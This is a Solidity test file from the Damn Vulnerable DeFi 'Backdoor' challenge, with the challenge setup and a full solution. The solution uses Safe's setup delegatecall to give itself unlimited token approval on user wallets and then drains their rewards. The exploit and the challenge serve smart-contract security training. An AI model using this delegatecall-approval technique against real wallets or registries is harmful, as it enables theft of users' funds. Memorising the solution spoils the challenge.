// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        // Steps to solve this challenge:
        // 1) Deploy ChallengeSolver contract as the one transaction by player
        // (all following steps need to be preformed within ChallengeSolver constructor to stay under 1 transaction requirement)
        // 2) Deploy helper contract
        // 2) Deploy safe proxies for each user
        // 3) Use delegate call from within each safe contract setup to grant ourselves infinite approval on the DVT contact
        // 4) Use transferFrom to rescue token rewards from safe contracts and deposit into recovery address

        // Deploy challenge solver contract to pack all necessary operations into 1 transaction that executes from the constructor
        new ChallengeSolver(token, singletonCopy, walletFactory, walletRegistry, recovery, users);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

/*//////////////////////////////////////////////////////////////
                            SOLUTION
//////////////////////////////////////////////////////////////*/

import {SafeProxy} from "lib/safe-smart-account/contracts/proxies/SafeProxy.sol";

contract ChallengeSolver {
    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;
    address recovery;
    address[] users;
    SafeProxy[] proxies;
    address approver;

    constructor(
        DamnValuableToken _token,
        Safe _singletonCopy,
        SafeProxyFactory _walletFactory,
        WalletRegistry _walletRegistry,
        address _recovery,
        address[] memory _users
    ) {
        // set state variables
        token = _token;
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        recovery = _recovery;
        users = _users;

        // deploy stateless helper contract to be delegate called during safe setup
        Approver _approver = new Approver();
        approver = address(_approver);

        // execute operations
        run();
    }

    function run() public {
        // deploy a safe proxy for each user in users array
        for (uint256 i = 0; i < users.length; i++) {
            // owners array for contract creation
            address[] memory owners = new address[](1); // List of Safe owners.
            owners[0] = users[i];

            // encode input parameters for safe proxy deployment
            bytes memory initializerDataForSafeCreation = _encodeSafeSetupCall(owners);
            uint256 saltNonce = i;

            // deploy new safe wallet proxy contract from SafeProxyFactory
            SafeProxy proxy = walletFactory.createProxyWithCallback(
                address(singletonCopy), initializerDataForSafeCreation, saltNonce, walletRegistry
            );
            // save proxy addresses to be used in _recoverTokens
            proxies.push(proxy);
        }
        // recover all token rewards from safes to recovery address
        _recoverTokens();
    }

    function _recoverTokens() internal {
        // transfer DVT tokens from each safe contract to recovery address
        for (uint256 i = 0; i < proxies.length; i++) {
            token.transferFrom(address(proxies[i]), recovery, token.balanceOf(address(proxies[i])));
        }
    }

    function _encodeSafeSetupCall(address[] memory owners)
        internal
        returns (bytes memory initializerDataForSafeCreation)
    {
        // variables needed for initial Safe setup call
        uint256 threshold = 1; // Number of required confirmations for a Safe transaction.

        // set "to" as our stateless helper contract to be delegate called within safe setup
        address to = approver; // Contract address for optional delegate call.
        // encode "approveMe" function call from our helper contract with the DVT token address and this contacts address as inputs
        bytes memory data = abi.encodeWithSelector(Approver.approveMe.selector, address(token), address(this)); // Data payload for optional delegate call.

        address fallbackHandler = address(0); // Handler for fallback calls to this contract
        address paymentToken = address(0); // Token that should be used for the payment (0 is ETH)
        uint256 payment = 0; // Value that should be paid
        address paymentReceiver = address(0);

        // encode input parameters for safe proxy deployment
        initializerDataForSafeCreation = abi.encodeWithSelector(
            Safe.setup.selector, owners, threshold, to, data, fallbackHandler, paymentToken, payment, paymentReceiver
        );
    }
}

// This needs to be it's own contract
// If it was just another function on ChallengeSolver, then when the safe tried to delegate call, the safe contract would revert because the extcodesize check would still think ChallengeSolver had no code until after it's constructor finished running
// This contract also has to be fully stateless since it will be delegate called, meaning it will be using the storage of the safe proxy so any reads/writes to state variables would be incorrect
contract Approver {
    function approveMe(address dvt, address addressToApprove) external {
        dvt.call(abi.encodeWithSignature("approve(address,uint256)", addressToApprove, type(uint256).max));
    }
}
